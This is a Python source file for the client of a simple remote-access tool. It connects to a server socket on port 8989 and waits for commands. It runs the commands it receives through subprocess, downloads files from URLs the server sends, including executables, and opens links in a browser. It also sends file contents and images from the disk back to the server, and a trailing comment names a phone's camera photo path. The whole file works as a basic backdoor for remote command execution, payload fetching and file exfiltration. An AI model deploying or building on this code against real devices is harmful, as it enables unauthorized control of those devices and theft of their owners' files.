from logging import exception
import time
import socket
import os
import subprocess
import re
from sys import getsizeof
import webbrowser
import requests

# Initialize soc to socket
soc = socket.socket()
hostname = socket.gethostname()
## getting the IP address using socket.gethostbyname() method
host = socket.gethostbyname(hostname)
#192.168.116.145
# Initialize the port
port=8989
#8989
# bind the socket with port and host
soc.connect((host, port))
print("[*]Connected to Server..")
# regex to check if anylink is sended 
url_regex = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
        r'localhost|' #localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
# receive the command from server program
while soc:
    # start recieving data
    command = soc.recv(1024)
    # decode it and print it
    command = command.decode()
    print(f'($):{command}')
    # match the command and execute it on client system
    if command.startswith("ls") or command=='df' or command=="pwd" or command== "ip" or re.match(url_regex, command) or command.endswith('.py') or command.endswith('.txt'):
        if command=="ip":
            command="ipconfig getifaddr en0".split()
            
        elif re.match(url_regex, command):
            if command.endswith('.py') or command.endswith('.txt') or command.endswith('.exe') or command.endswith('.ico'):
                response = requests.get(command.strip())
                open(command.split('/')[-1], "wb").write(response.content)
                command=["echo","True"]
            else:
                webbrowser.open(command,new=2)
                command=["echo","True"]
                     
        elif os. path. isfile(command)==True:
            command=["cat",command]
                
        else:
            command=command.split()
            
        try:
            # excute command declare its input to result variable
            result = subprocess.Popen(command,stdout=subprocess.PIPE).communicate()[0]
            # filename is equal to command
            filename=command
            #get the size of result
            filesize=getsizeof(result)
            # send the name and size of result
            send=f'{filename}*{filesize}'.encode()
            soc.send(send)
            time.sleep(3)
            # then send the result
            soc.send(result)
        except:
            result.kil()
            # if command is invalid 
            send=f'Invalid*6'.encode()
            soc.send(send)
            time.sleep(3)
            result="Error".encode()
            soc.send(result)
            
            
    # if server want to exit the connection 
    elif command=="end" or command=="exit" or command=="close":
        print("[-] Connection ended...")
        soc.close()
        exit()
        
        
    # file transfer 
    elif command.endswith('.jpg') or command.endswith('.png') or command.endswith('.jpeg') or command.endswith('.pdf') or command.endswith('.ico'):
        # check if the given file exist
        if os. path. isfile(command)==True:
            # get the name of file from path 
            filename=command.split('/')[-1]
            #get the size of file 
            filesize=os.path.getsize(command)
            # send the name and size to server
            send=f'{filename}*{filesize}'.encode()
            soc.send(send)
            time.sleep(2)
            # open the file in binary mode
            with open(command,'rb') as f:
                # send the server signal to begin the transfer
                soc.send(b'BEGIN')
                while True:
                    # start sending data from file 
                    content=f.read(1024)
                    soc.send(content)
                    # if no data left in file exit the loop
                    if not content:
                        print('{$} Breaking_from_sending_data')
                        break
                time.sleep(2)
                # send the ending signal to server 
                soc.send(b'ENDED')
        #if file path dosent exist send eroor msg to server
        
        else:
            send=f'invalid*5'.encode()
            soc.send(send)
            time.sleep(2)
            soc.send("Error".encode())
            
            
    else:
        send=f'invalid*5'.encode()
        soc.send(send)
        time.sleep(3)
        soc.send("Error".encode())
        
        
#/storage/emulated/0/DCIM/camera/IMG20220610102540.jpg
